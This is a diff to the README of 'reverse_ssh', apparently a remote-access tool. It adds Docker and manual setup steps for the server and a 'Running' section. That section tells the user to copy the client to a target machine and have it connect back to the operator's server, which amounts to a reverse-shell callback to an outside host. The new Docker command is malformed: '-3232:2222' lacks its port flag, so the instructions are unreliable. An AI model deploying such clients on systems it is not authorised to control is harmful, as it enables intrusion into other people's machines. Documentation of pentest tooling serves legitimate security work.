@@ -37,6 +37,8 @@ And more!
 
 - [Reverse SSH](#reverse-ssh)
   - [TL;DR](#tldr)
+    - [Setup](#setup)
+    - [Running](#running)
   - [Setup Instructions](#setup-instructions)
   - [Fancy Features](#fancy-features)
     - [Default Server](#default-server)
@@ -57,6 +59,15 @@ And more!
 
 ## TL;DR
 
+### Setup
+
+Docker:
+```
+sudo docker pull reversessh/reverse_ssh
+sudo docker run -3232:2222 -e EXTERNAL_ADDRESS=<your_external_address>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reverse_ssh
+```
+
+Manual:
 ```sh
 git clone https://github.com/NHAS/reverse_ssh
 
@@ -68,8 +79,12 @@ cd bin/
 # start the server
 cp ~/.ssh/id_ed25519.pub authorized_keys
 ./server 0.0.0.0:3232
+```
 
-# copy client to your target then connect to the server
+### Running
+
+```sh
+# copy client to your target then connect it to the server
 ./client your.rssh.server.com:3232
 
 # Get help text
